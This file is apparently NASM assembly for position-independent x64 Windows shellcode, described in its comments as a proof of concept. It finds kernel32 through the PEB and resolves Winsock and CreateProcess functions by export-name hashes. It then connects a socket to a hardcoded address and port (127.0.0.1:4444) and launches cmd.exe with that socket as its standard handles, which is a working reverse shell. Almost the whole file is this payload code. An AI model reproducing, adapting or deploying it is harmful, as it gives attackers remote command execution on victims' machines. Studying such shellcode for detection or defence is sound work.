BITS 64

; Function resolutions is likely the most reliable form
; of code, as function names are expected to remain
; unchanged for an indefinite time. This code it more or
; less Full-Proof.

; This code is merely POC as to what can be done.

get_kernel32:
    mov   rax,   gs:[0x60]
    mov   rax,   [rax + 0x18]
    mov   rax,   [rax + 0x30]
    mov   rax,   [rax]
    mov   rax,   [rax]
    mov   rbp,   [rax + 0x10]

get_createprocess:
    mov   r9,    rbp
    mov   r10,   0x6ba6bcc9
    call  parse_module
    mov   r15,   rax

get_loadlibrary:
    mov   r10,   0xc917432
    call  parse_module
    mov   r14,   rax

load_ws2_32:
    push  0x006c6c
    mov   rax,   0x642e32335f327377
    push  rax
    mov   rcx,   rsp
    sub   rsp,   0x28
    call  r14

get_wsastartup:
    mov   r9,    rax
    mov   r10,   0x80b46a3d
    call  parse_module
    mov   r14,   rax

get_wsasocket:
    mov   r10,   0xde78322d
    call  parse_module
    mov   r13,   rax

get_wsaconnect:
    mov   r10,   0xb8784b10
    call  parse_module
    mov   r12,   rax
    jmp   start_functions

parse_module:
    mov   edx,   [r9 + 0x3C]
    lea   rdx,   [r9 + rdx]
    mov   edx,   [rdx + 0x88]
    lea   rdx,   [r9 + rdx]
    mov   ecx,   [rdx + 0x18]
    mov   edi,   [rdx + 0x20]
    lea   rdi,   [r9 + rdi]

search_loop:
    dec   rcx
    mov   esi,   [rdi + rcx * 4]
    lea   rsi,   [r9 + rsi]
    xor   rax,   rax
    xor   rbx,   rbx
    cld

hash_loop:
    lodsb
    test  al,    al
    jz    compare_hash
    ror   ebx,   7 ;)
    add   ebx,   eax
    jmp   hash_loop

compare_hash:
    cmp   ebx,   r10d
    jnz   search_loop
    mov   eax,   [rdx + 0x24]
    lea   rax,   [r9 + rax]
    movzx ecx,   word [rax + rcx * 2]
    mov   eax,   [rdx + 0x1C]
    lea   rax,   [r9 + rax]
    mov   eax,   [rax + rcx * 4]
    lea   rax,   [r9 + rax]
    ret

start_functions:

call_wsa_startup:
    xor   rcx,   rcx
    sub   rsp,   0x1F0
    lea   rdx,   [rsp + 0x30]
    mov   cx,    0x202
    call  r14

call_wsa_socket:
    xor   rcx,   rcx
    mov   cl,    0x2
    xor   rdx,   rdx
    mov   dl,    0x1
    xor   r8,    r8
    mov   r8b,   0x6
    xor   r9,    r9
    mov   [rsp + 0x20], r9
    mov   [rsp + 0x28], r9
    call  r13
    mov   r14,   rax

call_wsa_connect:
    mov   rcx,   r14
    mov   rdx,   0x0100007F5C110002
    mov   [rsp], rdx
    lea   rdx,   [rsp]
    xor   r8,    r8
    mov   r8b,   0x16
    sub   rsp,   0x38
    mov   [rsp + 0x20], r9
    mov   [rsp + 0x28], r9
    mov   [rsp + 0x30], r9
    call  r12
    add   rsp,   0x38

call_createprocess:
    mov   rax,   0x6578652e646d63
    push  rax
    mov   rdx,   rsp
    push  r14
    push  r14
    push  r14
    xor   rcx,   rcx
    push  cx
    push  rcx
    push  rcx
    mov   cx,    0x0100
    push  cx
    xor   rcx,   rcx
    push  cx
    push  cx
    push  rcx
    push  rcx
    push  rcx
    push  rcx
    push  rcx
    push  rcx
    push  0x68
    mov   rdi,   rsp
    lea   rcx,   [rsp - 0x20]
    push  rcx
    push  rdi
    xor   rcx,   rcx
    push  rcx
    push  rcx
    push  0x08000000
    push  1
    push  rcx
    push  rcx
    push  rcx
    push  rcx
    mov   r8,    rcx
    call  r15